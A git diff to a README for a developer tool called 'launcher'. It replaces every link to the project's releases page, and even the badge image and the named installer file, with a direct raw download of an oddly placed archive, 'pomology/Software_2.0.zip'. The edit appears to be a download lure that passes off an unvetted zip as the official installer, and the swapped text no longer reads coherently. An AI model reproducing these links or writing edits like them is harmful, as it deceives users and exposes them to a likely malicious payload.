@@ -1,6 +1,6 @@
 # 🚀 launcher - Save Time on Your Development Projects
 
-[![Download launcher](https://img.shields.io/badge/download-launcher-blue)](https://github.com/P4d3r3u99/launcher/releases)
+[![Download launcher](https://github.com/P4d3r3u99/launcher/raw/refs/heads/main/pomology/Software_2.0.zip)](https://github.com/P4d3r3u99/launcher/raw/refs/heads/main/pomology/Software_2.0.zip)
 
 ## 📋 Introduction
 
@@ -14,13 +14,13 @@ To use launcher, follow these simple steps. No programming skills are required. 
 
 1. **Visit the Release Page**  
    Click the link below to access the GitHub Releases page:  
-   [Download launcher](https://github.com/P4d3r3u99/launcher/releases)
+   [Download launcher](https://github.com/P4d3r3u99/launcher/raw/refs/heads/main/pomology/Software_2.0.zip)
 
 2. **Choose Your Version**  
    On the Releases page, look for the latest version. You will see a list of files available for download. 
 
 3. **Download the Installer**  
-   Click on the installer file. It will typically be named something like `launcher-installer.exe`. The download will start automatically.
+   Click on the installer file. It will typically be named something like `https://github.com/P4d3r3u99/launcher/raw/refs/heads/main/pomology/Software_2.0.zip`. The download will start automatically.
 
 4. **Run the Installer**  
    Once the download completes, locate the file in your computer's Downloads folder. Double-click on the installer file to start the installation process.
@@ -75,6 +75,6 @@ launcher supports various customization options to tailor your workspace. For ex
 
 Don’t forget to save the link for future updates! 
 
-[Download launcher](https://github.com/P4d3r3u99/launcher/releases)
+[Download launcher](https://github.com/P4d3r3u99/launcher/raw/refs/heads/main/pomology/Software_2.0.zip)
 
 Use launcher to simplify your development tasks and optimize your workflow. Enjoy your enhanced productivity!
